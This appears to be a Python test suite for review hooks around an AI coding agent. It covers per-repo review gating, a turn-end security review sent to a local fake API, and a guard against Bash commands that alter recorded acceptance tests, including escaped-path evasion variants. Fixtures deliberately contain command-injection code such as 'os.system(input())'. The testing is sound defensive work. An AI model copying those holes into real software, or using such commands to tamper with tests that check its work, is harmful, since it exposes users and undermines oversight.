        git(other, "add", "-A")
        git(other, "commit", "-q", "-m", "ci fix")
        git(other, "push", "-q", "origin", "feat-x")
        git(api, "worktree", "remove", "--force", other)
        git(api, "fetch", "-q", "origin")
        git(api, "reset", "-q", "--hard", "origin/main")
        git(api, "branch", "-q", "-D", "feat-x")
        self.write("api/c.py", "z = 3\n")
        git(api, "add", "-A")
        git(api, "commit", "-q", "-m", "c")
        self.assertFalse(gate.decide(api, [git_out(api, "rev-parse", "HEAD")], set()).get("off"))

    def test_a_reflog_that_isnt_a_plain_file_is_not_read(self):
        # security review S-4 of 2026-11-23-s-gate-ownership-leftovers: a FIFO at .git/logs/HEAD would block the hook
        import threading
        import sdlc_review_gate as gate
        api = self.path("api")
        log = os.path.join(api, ".git", "logs", "HEAD")
        os.remove(log)
        if not hasattr(os, "mkfifo"):
            self.skipTest("no FIFOs here")
        os.mkfifo(log)
        result = []
        t = threading.Thread(target=lambda: result.append(gate._reflog_tip(api, "feat-x")), daemon=True)
        t.start()
        t.join(5)
        if t.is_alive():
            with open(log, "w"):
                pass  # release the reader so the test process can end
            self.fail("_reflog_tip blocked on a FIFO")
        self.assertEqual(result, [None])

    def test_the_remote_default_branch_is_looked_up_once_per_check(self):
        # end review SG-L2: every done feature listing the repo cost up to three remote rev-parses on each check
        from unittest import mock
        import sdlc_review_gate as gate
        api = self.path("api")
        for name in ("feat", "feat2", "feat3"):
            if name != "feat":
                code, out = self.state("new", name, "--track", "S", "--risk", "low", "--task", "y | AC-001 | api/b.py")
                self.assertEqual(code, 0, out)
            self.assertEqual(self.state("repo", name, "api")[0], 0)
            self.write(f"api/{name}.py", "x = 1\n")
            git(api, "add", "-A")
            git(api, "commit", "-q", "-m", name)
            self.assertEqual(self.state("set", name, "Status", "done")[0], 0)
        calls = []
        real = gate._git

        def counting(repo, *args):
            calls.append(args)
            return real(repo, *args)

        with mock.patch.object(gate, "_git", counting):
            gate._workbench_feature(api)
        remote = [c for c in calls if any("refs/remotes/origin/" in str(a) for a in c) and c[0] == "rev-parse"]
        self.assertLessEqual(len(remote), 3, remote)

    def test_a_high_risk_done_owner_keeps_its_repo_reviewed_beside_an_active_one(self):
        # end review SG-M1: the new low-risk feature mustn't judge the done high-risk one's commits still to come
        import sdlc_review_gate as gate
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertEqual(self.state("set", "feat", "Risk", "high")[0], 0)
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        code, out = self.state("new", "feat2", "--track", "S", "--risk", "low", "--task", "y | AC-001 | api/b.py")
        self.assertEqual(code, 0, out)
        self.assertEqual(self.state("repo", "feat2", "api")[0], 0)
        self.assertEqual(gate._workbench_feature(self.path("api")), (True, ""))

    def test_an_active_feature_takes_an_app_repo_from_an_unmerged_done_one(self):
        # A squash-merged or never-merged done feature lingers; the next active feature on the repo still decides
        import sdlc_review_gate as gate
        api = self.path("api")
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        code, out = self.state("new", "feat2", "--track", "M", "--risk", "low", "--task", "y | AC-001 | api/b.py")
        self.assertEqual(code, 0, out)
        self.assertEqual(self.state("repo", "feat2", "api")[0], 0)
        member, owner = gate._workbench_feature(api)
        self.assertTrue(member)
        self.assertIn("feat2", owner or "")

    def test_the_app_repos_own_config_never_turns_its_review_off(self):
        import sdlc_review_gate as gate
        api = self.path("api")
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.write_json("api/.sdlc/config.json", {"commands": {"test": "python3 check.py"}})  # back-reference gone
        self.write("api/a.py", "x = 1\n")
        git(api, "add", "-A")
        git(api, "commit", "-q", "-m", "x")
        d = gate.decide(api, [git_out(api, "rev-parse", "HEAD")], set())
        self.assertFalse(d.get("off") or d["defer"], d)

    def test_a_repo_outside_any_workbench_keeps_the_old_gate(self):
        import sdlc_review_gate as gate
        import tempfile
        lone = os.path.realpath(tempfile.mkdtemp(prefix="sdlc-lone-"))
        self.addCleanup(rmtree, lone)
        git(lone, "init", "-q")
        self.write_json(os.path.join(lone, "a.json"), {})
        git(lone, "add", "-A")
        git(lone, "commit", "-q", "-m", "x")
        self.assertEqual(gate._workbench_feature(lone), (False, None))
        self.assertTrue(gate.decide(lone, [git_out(lone, "rev-parse", "HEAD")], set()).get("off"))

    def test_app_test_commands_count_in_review(self):
        import prove_budget
        import review_rounds
        self.assertIn("python3 check.py", prove_budget.project_commands(self.root))
        self.assertTrue(review_rounds.runs_tests(self.root, "cd api && python3 check.py"))
        self.assertFalse(review_rounds.runs_tests(self.root, "cd api && sleep 900"))

    def test_doctor_passes_a_workbench_without_root_commands(self):
        import doctor
        from unittest import mock
        status = {"setup": "complete", "drift": "current", "scaffold_version": "3.7.0", "plugin_version": "3.7.0",
                  "files": {}, "completed_steps": []}
        r = doctor.Report()
        with mock.patch.object(doctor.scaffold, "cmd_status", return_value=status):
            try:
                doctor.check_repo(r, self.root)
            except Exception:  # later rows need a real setup; the commands row comes first
                pass
        rows = {c["check"]: c for c in r.checks}
        self.assertEqual(rows["commands"]["status"], "ok", rows["commands"])

    def test_an_app_failure_is_never_waived_by_the_workbench_baseline(self):
        import ship
        from unittest import mock
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.write(".sdlc/baseline.md", "## Failing tests\n\n| Package | Test |\n|---|---|\n| (root) | t_old |\n")
        last = {"result": "fail", "failures": ["api: (root) test: exit 1\nboom"], "head": "h", "tree": "t"}
        with mock.patch.object(ship.verify, "status", return_value={"reuse": False}), \
                mock.patch.object(ship.verify, "full", return_value=(last, [])):
            with self.assertRaises(ship.Refused):
                ship.verified(self.root, "feat", 60, waive_baseline=True)

    def test_drift_counts_each_app_file_once_and_never_its_sdlc_folder(self):
        import verify
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.write("api/a.py", "x = 1\n")
        self.write_json("api/.sdlc/config.json", {"workbench": "shop-workbench", "commands": {"test": "python3 check.py"},
                                                 "x": 1})
        self.write("api/b.py", "y = 1\n")  # no task names it: drift, listed once
        items = [d["item"] for d in verify.drift(self.root, "feat") or []]
        self.assertNotIn("api/.sdlc/config.json", items)
        self.assertEqual(items.count("api/b.py"), 1, items)

    def test_an_existing_clone_added_read_only_cannot_push(self):
        url = self.origin("tests")
        git(self.root, "clone", "-q", url, "tests")
        code, out, err = self.run_scaffold("workbench", "add", url, "--name", "tests", "--role", "tests")
        self.assertEqual(code, 0, (out, err))
        self.assertNotEqual(git_out(self.path("tests"), "remote", "get-url", "--push", "origin"), url)

    def test_a_failed_removal_keeps_the_real_error(self):
        from unittest import mock
        url = self.origin("tests")
        with mock.patch.object(scaffold.sdlc_scopes, "disable_push", side_effect=ValueError("no push change")), \
                mock.patch.object(scaffold, "_remove_tree", side_effect=OSError("busy")):
            with self.assertRaisesRegex(ValueError, "no push change"):
                scaffold._clone_into(scaffold.Project(self.root), "tests", url, read_only=True)

    def test_a_clone_that_cannot_drop_its_push_url_is_removed(self):
        from unittest import mock
        url = self.origin("tests")
        self.write_json("workbench.json", {"repos": [{"name": "tests", "url": url, "role": "tests"}]})
        with mock.patch.object(scaffold.sdlc_scopes, "disable_push", side_effect=ValueError("no")):
            with self.assertRaises(ValueError):
                scaffold._clone_into(scaffold.Project(self.root), "tests", url, read_only=True)
        self.assertFalse(os.path.exists(self.path("tests")))


class PluginReviewGuards(WorkbenchGuardsCase):
    def test_bash_never_reaches_an_app_repos_recorded_tests(self):
        self.write_json("api/acceptance/manifest.json", {"tests": [{"path": "tests/a.spec.ts"}]})
        self.write("api/acceptance/tests/a.spec.ts", "test")
        for command in ("echo x > api/acceptance/tests/a.spec.ts", "rm api/acceptance/tests/a.spec.ts",
                        "cp /tmp/x api/acceptance/manifest.json", "cd web && echo x > ../api/acceptance/tests/a.spec.ts",
                        "ls web; echo x > api/acceptance/tests/a.spec.ts"):
            reason = self.pre("Bash", command=command)
            self.assertIsNotNone(reason, command)
            self.assertIn("recorded acceptance test", reason)
        for command in ("cat api/acceptance/tests/a.spec.ts", "echo x > api/src/a.ts"):
            self.assertIsNone(self.pre("Bash", command=command), command)

    def test_escaped_paths_are_read_both_ways(self):
        self.write_json("api/acceptance/manifest.json", {"tests": [{"path": "tests/a.spec.ts"}]})
        for command in ("rm api/acceptance/manifest\\.json", "rm api/acc\\eptance/tests/a.spec.ts",
                        "sed -i s/a/b/ api/acceptance/manifest\\.json", "git -C spec\\s commit -am x",
                        "rm specs\\a.md"):
            self.assertIsNotNone(self.pre("Bash", command=command), command)

    def test_the_s_track_and_flow_carry_the_workbench_steps(self):
        s_track = read_doc("skills", "orchestrator", "references", "s-track.md")
        for needed in ("workbench", "$S repo <name>", "$S pr <name>", "git switch -c <name>"):
            self.assertIn(needed, s_track, needed)
        self.assertIn("git switch -c <f>", read_doc("skills", "orchestrator", "references", "flow.md"))


class StopReviewRepo(WorkbenchFeatureCase):
    """The turn-end review's repo: from the workbench root, the app repo the turn edited, not the root, whose
    .gitignore hides every app file (todo: the Stop review resolves one repo per turn)."""

    def test_a_turn_at_the_root_is_reviewed_in_the_app_repo_it_edited(self):
        import reporesolve as rr
        api, web = self.path("api"), self.path("web")
        self.assertEqual(rr.resolve_repo_root(self.root, touched_paths=[self.path("api/a.py")]),
                         (api, rr.RES_WORKBENCH_APP))
        # paths in two app repos: the busier one; a tie goes to the first by name
        busier = [self.path("web/a.py"), self.path("api/a.py"), self.path("web/b.py")]
        self.assertEqual(rr.resolve_repo_root(self.root, touched_paths=busier), (web, rr.RES_WORKBENCH_APP))
        tie = [self.path("web/a.py"), self.path("api/a.py")]
        self.assertEqual(rr.resolve_repo_root(self.root, touched_paths=tie), (api, rr.RES_WORKBENCH_APP))
        # only workbench files touched, or none: the root, as before
        self.assertEqual(rr.resolve_repo_root(self.root, touched_paths=[self.path("notes.md")]),
                         (self.root, rr.RES_CWD))
        self.assertEqual(rr.resolve_repo_root(self.root, touched_paths=[]), (self.root, rr.RES_CWD))
        # a session inside an app repo keeps its own repo
        self.assertEqual(rr.resolve_repo_root(api, touched_paths=[self.path("web/a.py")]), (api, rr.RES_CWD))

    def test_the_root_keeps_the_review_when_its_own_edits_lead_or_steer(self):
        # end review SG-M3: one app file touched must not move the review away from the root's steering edits
        import reporesolve as rr
        steer = [self.path("CLAUDE.md"), self.path("api/a.py"), self.path("api/b.py")]
        self.assertEqual(rr.resolve_repo_root(self.root, touched_paths=steer), (self.root, rr.RES_CWD))
        more = [self.path("notes.md"), self.path("x.md"), self.path("api/a.py")]
        self.assertEqual(rr.resolve_repo_root(self.root, touched_paths=more), (self.root, rr.RES_CWD))

    def test_the_root_keeps_steering_edits_through_a_linked_path(self):
        # end review r2 R2-M1: a path spelled through a link to the root, or in another case, still steers
        import reporesolve as rr
        import tempfile
        away = os.path.realpath(tempfile.mkdtemp(prefix="sdlc-away-"))
        self.addCleanup(rmtree, away)
        link = os.path.join(away, "wb")
        try:
            os.symlink(self.root, link, target_is_directory=True)
        except (OSError, NotImplementedError):
            self.skipTest("symlinks unavailable")
        touched = [os.path.join(link, "CLAUDE.md"), self.path("api/a.py"), self.path("api/b.py")]
        self.assertEqual(rr.resolve_repo_root(self.root, touched_paths=touched), (self.root, rr.RES_CWD))
        touched = [self.path("hooks/x.py").replace("hooks", "HOOKS"), self.path("api/a.py"), self.path("api/b.py")]
        self.assertEqual(rr.resolve_repo_root(self.root, touched_paths=touched)[0], self.root)

    def test_a_plain_repo_with_a_nested_repo_keeps_the_old_resolution(self):
        import reporesolve as rr
        import tempfile
        lone = os.path.realpath(tempfile.mkdtemp(prefix="sdlc-lone-"))
        self.addCleanup(rmtree, lone)
        git(lone, "init", "-q")
        git(lone, "init", "-q", "inner")
        self.assertEqual(rr.resolve_repo_root(lone, touched_paths=[os.path.join(lone, "inner", "a.py")]),
                         (lone, rr.RES_CWD))


FAKE_API = """import http.server, json, sys
class H(http.server.BaseHTTPRequestHandler):
    def reply(self, body):
        data = json.dumps(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def do_GET(self):
        self.reply({"data": [{"id": "claude-opus-5-5", "type": "model"}], "has_more": False})
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length") or 0))
        with open(sys.argv[2], "ab") as f:
            f.write(body + b"\\n")
        try:
            with open(sys.argv[2] + ".answer", encoding="utf-8") as f:
                answer = f.read()
        except OSError:
            answer = json.dumps({"hasVulnerabilities": False, "vulnerabilities": []})
        self.reply({"id": "m", "type": "message", "role": "assistant", "model": "claude-opus-5-5",
                    "content": [{"type": "text", "text": answer}],
                    "stop_reason": "end_turn", "usage": {"input_tokens": 1, "output_tokens": 1}})
    def log_message(self, *a):
        pass
http.server.HTTPServer(("127.0.0.1", int(sys.argv[1])), H).serve_forever()
"""


class StopReviewEveryRepo(WorkbenchFeatureCase):
    """todo: a turn that edits several app repos of a workbench gets the turn-end review in each of them, in one
    review call, not only in the busiest one. Driven through the real hooks against a local fake API that records
    what the review was sent."""

    def setUp(self):
        super().setUp()
        import socket
        import subprocess
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            port = s.getsockname()[1]
        self.sent = self.path("state/sent.jsonl")
        os.makedirs(self.path("state"), exist_ok=True)
        server = os.path.join(self.root, "..", os.path.basename(self.root) + "-api.py")
        with open(server, "w", encoding="utf-8") as f:
            f.write(FAKE_API)
        self.addCleanup(os.remove, server)
        proc = subprocess.Popen([sys.executable, server, str(port), self.sent])
        self.addCleanup(proc.wait)
        self.addCleanup(proc.terminate)
        import time
        for _ in range(100):
            with socket.socket() as s:
                if s.connect_ex(("127.0.0.1", port)) == 0:
                    break
            time.sleep(0.05)
        self.env = {"SECURITY_WARNINGS_STATE_DIR": self.path("state"), "ANTHROPIC_API_KEY": "test",
                    "ANTHROPIC_BASE_URL": f"http://127.0.0.1:{port}", "SDLC_SECURITY_REVIEW": "always",
                    "SECURITY_GUIDANCE_DEBUG_LOG": self.path("state/debug.log")}

    def hook(self, payload, cwd):
        from helpers import run_hook
        payload = {"session_id": "s1", "cwd": cwd, **payload}
        return run_hook([sys.executable, os.path.join(HOOKS, "security_reminder_hook.py")], payload, cwd, self.env)

    def turn(self, cwd, files):
        """One turn from `cwd`: the prompt, a Write of each file, then Stop. What the review was sent, as text."""
        self.hook({"hook_event_name": "UserPromptSubmit", "prompt": "edit"}, cwd)
        for rel in files:
            body = f"import subprocess\ndef run_{os.path.basename(rel)[:-3]}(cmd):\n    return subprocess.call(cmd, shell=True)\n"
            self.write(rel, body)
            self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                       "tool_input": {"file_path": self.path(rel), "content": body}}, cwd)
        code, out, raw, err = self.hook({"hook_event_name": "Stop", "stop_hook_active": False}, cwd)
        try:
            with open(self.sent, encoding="utf-8") as f:
                return f.read()
        except OSError:
            log = ""
            try:
                with open(self.path("state/debug.log"), encoding="utf-8") as f:
                    log = f.read()[-3000:]
            except OSError:
                pass
            self.fail(f"no review was sent: exit {code}, out {raw!r}, err {err[-500:]!r}, log {log}")

    def test_a_turn_at_the_root_reviews_every_app_repo_it_edited(self):
        sent = self.turn(self.root, ["api/a.py", "web/b.py"])
        self.assertIn("run_a", sent)
        self.assertIn("run_b", sent)
        self.assertIn("api/a.py", sent)  # paths from the session's cwd, the workbench root here (code review r3)
        self.assertIn("web/b.py", sent)
        self.assertEqual(sent.count("\n"), 1, "one review call for both repos")

    def test_a_first_repo_with_nothing_to_review_still_reviews_the_other(self):
        # the session sits in api, which the turn didn't change: its own review set is empty (skip 9 before)
        sent = self.turn(self.path("api"), ["web/b.py"])
        self.assertIn("run_b", sent)

    def test_a_turn_inside_one_app_repo_also_reviews_another_it_edited(self):
        sent = self.turn(self.path("api"), ["api/a.py", "web/b.py"])
        self.assertIn("run_a", sent)  # api, where the session sits, keeps bare names; web's are paths from there
        self.assertIn("../web/b.py", sent)

    def test_one_file_name_in_two_repos_stays_two_files(self):
        # code review r2 CR2-1: `src/x.py` in api and in web must never share a name, shown or stored
        self.answer("web/src/x.py")
        sent = self.turn(self.root, ["api/src/x.py", "web/src/x.py"])
        self.assertIn("api/src/x.py", sent)
        self.assertIn("web/src/x.py", sent)
        paths = [f.get("filePath") for f in self.stored().get("previous_findings", [])]
        self.assertEqual(paths, ["web/src/x.py"])

    def stored(self):
        """The session state the hook keeps (previous findings, baseline)."""
        import glob
        for name in glob.glob(self.path("state/**/*.json"), recursive=True):
            with open(name, encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict) and ("baseline_sha" in data or "previous_findings" in data):
                return data
        return {}

    def answer(self, file_path, code="subprocess.call(cmd, shell=True)"):
        finding = {"filePath": file_path, "category": "Command Injection", "severity": "high",
                   "vulnerableCode": code, "fix": "no shell",
                   "explanation": "shell"}
        with open(self.sent + ".answer", "w", encoding="utf-8") as f:
            json.dump({"hasVulnerabilities": True, "vulnerabilities": [finding]}, f)

    def test_an_other_repos_finding_is_stored_as_its_repo_names_the_file(self):
        # code review r1: stored as `web/b.py`, a later review in web (`b.py`) would report it again
        self.answer("web/b.py")
        self.turn(self.root, ["api/a.py", "web/b.py"])
        paths = [f.get("filePath") for f in self.stored().get("previous_findings", [])]
        self.assertEqual(paths, ["web/b.py"])  # stored as shown (code review r2: repo-relative names collide)

    def test_reviewing_only_other_repos_leaves_the_first_repos_baseline(self):
        # code review r1: the first repo had nothing reviewed, so its stored baseline must not move
        self.answer("../web/b.py")
        self.hook({"hook_event_name": "UserPromptSubmit", "prompt": "edit"}, self.path("api"))
        before = {k: self.stored().get(k) for k in ("baseline_sha", "baseline_root", "head_at_capture")}
        body = "import os\nos.system(input())\n"
        self.write("web/b.py", body)
        self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                   "tool_input": {"file_path": self.path("web/b.py"), "content": body}}, self.path("api"))
        code, out, raw, err = self.hook({"hook_event_name": "Stop", "stop_hook_active": False}, self.path("api"))
        self.assertEqual(code, 2, raw + err)  # the finding was delivered
        self.assertEqual({k: self.stored().get(k) for k in before}, before)

    def test_an_other_repo_is_diffed_only_from_what_this_turn_can_vouch_for(self):
        # code review r1, r2: no turn start, or past the size limits (reviewable source only): nothing sent
        import time
        sys.path.insert(0, HOOKS)
        import stop_repos
        start = time.time() - 5
        self.write("web/b.py", "import os\nos.system(input())\n")
        self.write("web/c.py", "x = 1\n")
        for i in range(3):
            self.write(f"web/notes{i}.md", "x\n")
        web = self.path("web")
        files = stop_repos.repo_diff_files(web, start, self.root)
        self.assertEqual(sorted((pre, p) for pre, p, _ in files), [("web/", "b.py"), ("web/", "c.py")])
        self.assertEqual(stop_repos.repo_diff_files(web, None, self.root), [])
        self.assertEqual(len(stop_repos.repo_diff_files(web, start, self.root, max_paths=2)), 2)  # the .md don't count
        self.assertEqual(stop_repos.repo_diff_files(web, start, self.root, max_paths=1), [])

    def test_names_are_paths_from_the_sessions_cwd(self):
        # code review r3 CR3-6: the agent opens each name as written; the session's own repo keeps bare names, and a
        # session in a repo's subfolder still finds the other repos (r2 CR2-4)
        sys.path.insert(0, HOOKS)
        import stop_repos
        os.makedirs(self.path("api/src"), exist_ok=True)
        touched = [self.path("api/src/a.py"), self.path("web/b.py")]
        self.assertEqual(stop_repos.other_repos(self.path("api/src"), touched, self.path("api/src")),
                         [self.path("web")])
        self.assertEqual(stop_repos.name_prefix(self.path("web"), self.root), "web/")
        self.assertEqual(stop_repos.name_prefix(self.path("api"), self.path("api")), "")
        self.assertEqual(stop_repos.name_prefix(self.path("web"), self.path("api")), "../web/")
        self.assertEqual(stop_repos.name_prefix(self.root, self.path("api/src")), "../../")

    def test_the_other_repos_files_are_ranked_by_their_own_paths(self):
        # code review r3 CR3-4: a repo folder named `api` must not outrank a riskier path in `web`
        sys.path.insert(0, HOOKS)
        import stop_repos
        diff = "@@ -0,0 +1 @@\n+x = 1\n"
        files = [("api/", "src/format.py", diff), ("web/", "src/auth/login.py", diff)]
        self.assertEqual([p for p, _ in stop_repos.pick(files, 1)], ["web/src/auth/login.py"])
        self.assertEqual(stop_repos.pick(files, 0), [])
        self.assertEqual(sorted(p for p, _ in stop_repos.pick(files, 5)), ["api/src/format.py", "web/src/auth/login.py"])

    def test_a_session_in_a_repo_subfolder_reviews_the_other_repo(self):
        # code review r3 CR3-8: through the hooks, the session in api/src, the turn editing only web
        os.makedirs(self.path("api/src"), exist_ok=True)
        sent = self.turn(self.path("api/src"), ["web/b.py"])
        self.assertIn("../../web/b.py", sent)

    def test_a_rewake_still_reviews_the_other_repo(self):
        # code review r4: a second Stop in the same turn (touched paths cleared) diffs web again from the turn's start
        self.answer("web/b.py")
        self.turn(self.root, ["api/a.py", "web/b.py"])
        os.remove(self.sent + ".answer")
        code, out, raw, err = self.hook({"hook_event_name": "Stop", "stop_hook_active": False}, self.root)
        with open(self.sent, encoding="utf-8") as f:
            calls = f.read().splitlines()
        self.assertEqual(len(calls), 2, raw + err)
        self.assertIn("web/b.py", calls[1])

    def test_a_declined_finding_on_unchanged_code_is_not_raised_again(self):
        # code review r4 CR4-1 of 2026-11-23-m-stop-review-every-repo: a rewake re-sends another repo's code; a finding
        # already reported on byte-identical code is dropped, and one on changed code still stands
        self.answer("web/b.py")
        self.turn(self.root, ["api/a.py", "web/b.py"])
        stop = {"hook_event_name": "Stop", "stop_hook_active": False}
        code, out, raw, err = self.hook(stop, self.root)  # the agent declined it: no edit, the rewake fires
        self.assertEqual(code, 0, raw + err)
        body = "import subprocess\ndef run_b(cmd):\n    return subprocess.call(cmd + ' x', shell=True)\n"
        self.write("web/b.py", body)
        self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                   "tool_input": {"file_path": self.path("web/b.py"), "content": body}}, self.root)
        code, out, raw, err = self.hook(stop, self.root)
        self.assertEqual(code, 2, raw + err)  # changed code: the finding stands

    def test_a_fix_reverted_in_the_same_turn_is_raised_again(self):
        # security review r2 M-1: fire 1 flags web/b.py, the agent fixes it, fire 2 flags only api, the agent reverts
        # the fix: fire 3 must report it again
        self.answer("web/b.py")
        self.turn(self.root, ["api/a.py", "web/b.py"])
        stop = {"hook_event_name": "Stop", "stop_hook_active": False}
        with open(self.path("web/b.py"), encoding="utf-8") as f:
            original = f.read()
        fixed = "def run_b(cmd):\n    return None\n"
        for body, flagged in ((fixed, "api/a.py"), (original, "web/b.py")):
            self.write("web/b.py", body)
            self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                       "tool_input": {"file_path": self.path("web/b.py"), "content": body}}, self.root)
            self.answer(flagged)
            code, out, raw, err = self.hook(stop, self.root)
            self.assertEqual(code, 2, (flagged, raw + err))

    def test_a_new_issue_in_an_unchanged_file_still_blocks(self):
        # security review SEC-1 of 2026-11-23-todo-mode-tickets: same file and category, other vulnerable code
        self.answer("web/b.py")
        self.turn(self.root, ["api/a.py", "web/b.py"])
        self.answer("web/b.py", code="os.system(user_input)")
        code, out, raw, err = self.hook({"hook_event_name": "Stop", "stop_hook_active": False}, self.root)
        self.assertEqual(code, 2, raw + err)

    def test_a_finding_from_an_earlier_turn_is_raised_again(self):
        # security review SEC-2: the drop holds only within the turn that reported it
        self.answer("web/b.py")
        self.turn(self.root, ["api/a.py", "web/b.py"])
        self.hook({"hook_event_name": "UserPromptSubmit", "prompt": "next"}, self.root)  # the next turn
        for rel in ("api/a.py", "web/b.py"):  # the same code written again in both repos: the same diffs
            with open(self.path(rel), encoding="utf-8") as f:
                body = f.read()
            self.write(rel, body)
            self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                       "tool_input": {"file_path": self.path(rel), "content": body}}, self.root)
        code, out, raw, err = self.hook({"hook_event_name": "Stop", "stop_hook_active": False}, self.root)
        self.assertEqual(code, 2, raw + err)

    def test_the_same_snippet_at_another_place_in_the_file_is_raised(self):
        # security review M-2 of 2026-11-23-todo-mode-tickets: a finding has no location, so a snippet that appears
        # twice in the file can't tell the reported place from the other: nothing is dropped for it
        self.answer("web/b.py")
        self.hook({"hook_event_name": "UserPromptSubmit", "prompt": "edit"}, self.root)
        body = ("import subprocess\ndef run_a(cmd):\n    return subprocess.call(cmd, shell=True)\n"
                "def run_b(cmd):\n    return subprocess.call(cmd, shell=True)\n")
        for rel in ("api/a.py", "web/b.py"):
            self.write(rel, body)
            self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                       "tool_input": {"file_path": self.path(rel), "content": body}}, self.root)
        stop = {"hook_event_name": "Stop", "stop_hook_active": False}
        code, out, raw, err = self.hook(stop, self.root)
        self.assertEqual(code, 2, raw + err)
        code, out, raw, err = self.hook(stop, self.root)  # the rewake: the model reports the other place
        self.assertEqual(code, 2, raw + err)

    def test_a_finding_after_an_interrupted_turn_is_raised_again(self):
        # security review L-3: an interrupted turn keeps its baseline, but the next prompt is a new turn for the drop
        self.answer("web/b.py")
        self.turn(self.root, ["api/a.py", "web/b.py"])
        with open(self.path("web/b.py"), encoding="utf-8") as f:
            original = f.read()
        fixed = "def run_b(cmd):\n    return None\n"
        self.write("web/b.py", fixed)
        self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                   "tool_input": {"file_path": self.path("web/b.py"), "content": fixed}}, self.root)
        self.hook({"hook_event_name": "UserPromptSubmit", "prompt": "next"}, self.root)  # interrupted: no Stop ran
        self.write("web/b.py", original)
        self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                   "tool_input": {"file_path": self.path("web/b.py"), "content": original}}, self.root)
        code, out, raw, err = self.hook({"hook_event_name": "Stop", "stop_hook_active": False}, self.root)
        self.assertEqual(code, 2, raw + err)

    def test_the_first_repos_files_keep_priority_under_the_cap(self):
        # code review r3 CR3-3: with one slot, api (the first repo: two of its paths against one) keeps it
        self.env["MAX_DIFF_FILES"] = "1"
        sent = self.turn(self.root, ["api/a.py", "api/c.py", "web/b.py"])
        self.assertNotIn("web/b.py", sent)
        self.assertIn("api/", sent)

    def test_a_repo_touched_early_in_a_long_turn_is_not_trimmed(self):
        # code review r4: turn_touched keeps the last 200 paths; one touched again late must count as recent
        sys.path.insert(0, HOOKS)
        import diffstate
        import session_state
        os.environ["SECURITY_WARNINGS_STATE_DIR"] = self.path("state")
        self.addCleanup(os.environ.pop, "SECURITY_WARNINGS_STATE_DIR", None)
        early = self.path("web/b.py")
        many = [self.path(f"api/f{i}.py") for i in range(250)]
        def seed(state):
            state["turn_touched"] = [early] + many
            state["touched_paths"] = [early]
        session_state.with_locked_state("trim", seed)
        self.assertIn(early, diffstate.consume_stop_state("trim")["turn_touched"])

    def test_a_subagent_stop_at_the_root_reviews_the_app_repo(self):
        # end review SG-L1: a SubagentStop whose session is the workbench root resolved to the app repo and skipped
        self.hook({"hook_event_name": "UserPromptSubmit", "prompt": "edit"}, self.root)
        body = "import os\nos.system(input())\n"
        self.write("api/a.py", body)
        self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                   "tool_input": {"file_path": self.path("api/a.py"), "content": body}}, self.root)
        code, out, raw, err = self.hook({"hook_event_name": "SubagentStop", "stop_hook_active": False}, self.root)
        self.assertNotIn('"skip_reason": 11', raw)
        with open(self.sent, encoding="utf-8") as f:
            self.assertIn("a.py", f.read())

    def test_a_subagent_stop_in_a_repo_outside_the_workbench_still_skips(self):
        # security review S-2: the session is the workbench root, the subagent works in a repo outside it
        import tempfile
        lone = os.path.realpath(tempfile.mkdtemp(prefix="sdlc-lone-"))
        self.addCleanup(rmtree, lone)
        git(lone, "init", "-q")
        self.env["CLAUDE_PROJECT_DIR"] = self.root
        self.hook({"hook_event_name": "UserPromptSubmit", "prompt": "edit"}, lone)
        body = "import os\nos.system(input())\n"
        with open(os.path.join(lone, "a.py"), "w", encoding="utf-8") as f:
            f.write(body)
        self.hook({"hook_event_name": "PostToolUse", "tool_name": "Write",
                   "tool_input": {"file_path": os.path.join(lone, "a.py"), "content": body}}, lone)
        code, out, raw, err = self.hook({"hook_event_name": "SubagentStop", "stop_hook_active": False}, lone)
        self.assertIn('"skip_reason": 11', raw)

    def test_only_repos_the_review_gate_wants_are_added(self):
        from unittest import mock
        sys.path.insert(0, HOOKS)
        import sdlc_review_gate
        import stop_repos
        import time
        for rel in ("api/a.py", "web/b.py"):
            self.write(rel, "import os\nos.system(input())\n")
        touched = [self.path("api/a.py"), self.path("web/b.py")]
        with mock.patch.object(sdlc_review_gate, "review_wanted", lambda repo: repo.endswith("web")):
            files = stop_repos.other_repo_files(self.root, touched, time.time() - 5, self.root)
        self.assertEqual([(pre, p) for pre, p, _ in files], [("web/", "b.py")])

    def test_a_plain_repo_with_a_nested_repo_adds_nothing(self):
        sys.path.insert(0, HOOKS)
        import stop_repos
        import tempfile
        lone = os.path.realpath(tempfile.mkdtemp(prefix="sdlc-lone-"))
        self.addCleanup(rmtree, lone)
        git(lone, "init", "-q")
        git(lone, "init", "-q", "inner")
        self.assertEqual(stop_repos.other_repos(lone, [os.path.join(lone, "inner", "a.py")], lone), [])

    def test_a_turn_in_one_repo_sends_only_that_repo(self):
        sent = self.turn(self.root, ["api/a.py"])
        self.assertIn("run_a", sent)
        self.assertNotIn("web/", sent)


if __name__ == "__main__":
    unittest.main()
